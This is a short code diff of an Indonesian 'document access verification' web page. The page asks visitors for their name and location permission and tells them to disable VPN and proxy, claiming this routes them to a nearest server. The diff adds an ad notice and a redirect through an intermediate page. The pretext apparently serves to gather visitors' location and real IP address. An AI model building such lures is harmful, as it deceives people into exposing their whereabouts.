@@ -27,6 +27,7 @@
   <h2>Verifikasi Akses Dokumen</h2>
   <p>Masukkan nama dan izinkan lokasi untuk mengakses dokumen. Agar dirutekan ke Server terdekat</p>
   <p>Mohon untuk mematikan VPN, Proxy, dan Hemat Daya.</p>
+  <p>Mohon dimaklumi tentang <strong>Iklannya</strong>karena<strong>Gratis</strong></p>
   <img src="https://github.com/mukti-nux/Framer-asset/blob/main/download.jpeg?raw=true" alt="OnlineImg" width="200"> <br><br>
 
   <!-- Audio dari GitHub (dimulai dengan muted agar bisa autoplay) -->
@@ -106,7 +107,8 @@
           .then((res) => res.json())
           .then((data) => {
             if (data.redirectTo) {
-              window.location.href = data.redirectTo;
+              localStorage.setItem("tujuanAkhir", data.redirectTo);
+              window.location.href = "/intermediate.html";
             } else {
               alert("Link tidak ditemukan.");
             }
